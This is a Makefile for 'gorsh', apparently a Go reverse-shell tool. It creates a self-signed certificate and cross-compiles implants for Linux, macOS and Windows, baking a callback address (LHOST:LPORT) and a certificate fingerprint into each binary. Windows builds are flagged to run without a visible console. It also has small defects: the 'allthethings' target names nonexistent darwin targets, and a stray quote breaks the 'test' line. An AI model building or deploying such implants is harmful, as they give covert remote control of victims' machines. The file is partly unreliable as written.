NAME=gorsh
# please god find a better name

OUT_LINUX=binaries/linux/${NAME}
OUT_MACOS=binaries/macos/${NAME}
OUT_WINDOWS=binaries/windows/${NAME}
SRV_KEY=local/server.key
SRV_PEM=local/server.pem

BUILD=go build
SRC=gorsh.go

STRIP=
#STRIP=-s
SUDO=sudo
# SUDO=
LINUX_LDFLAGS=--ldflags "$(STRIP) -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)"
WIN_LDFLAGS=--ldflags "$(STRIP) -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2) -H=windowsgui"

all: clean depends shell

depends:
	openssl req -subj '/CN=sysdream.com/O=Sysdream/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
	cat ${SRV_KEY} >> ${SRV_PEM}

shell:
	GOOS=${GOOS} GOARCH=${GOARCH} ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC}

linux32:
	CGO_ENABLED=1 GOOS=linux GOARCH=386 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX}32 ${SRC}

linux64:
	GOOS=linux GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX}64 ${SRC}

windows32:
	CGO_ENABLED=1 GOOS=windows GOARCH=386 ${BUILD} ${WIN_LDFLAGS} -o ${OUT_WINDOWS}32.exe ${SRC}

windows64:
	CGO_ENABLED=1 GOOS=windows GOARCH=amd64 ${BUILD} ${WIN_LDFLAGS} -o ${OUT_WINDOWS}64.exe ${SRC}

macos32:
	GOOS=darwin GOARCH=386 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_MACOS}32 ${SRC}

macos64:
	GOOS=darwin GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_MACOS}64 ${SRC}

allthethings: linux32 linux64 windows32 windows64 darwin32 darwin64

clean:
	@rm -f ${SRV_KEY} ${SRV_PEM} ${OUT_LINUX} ${OUT_WINDOWS} ${OUT_MACOS} \
		&& echo "ceritificates, keys and binaries removed successfully"
test:
	@echo "it works!""

.PHONY : depends all allthethings macos64 macos32 windows64 windows32 linux64 linux32 shell depends mingw_packages clean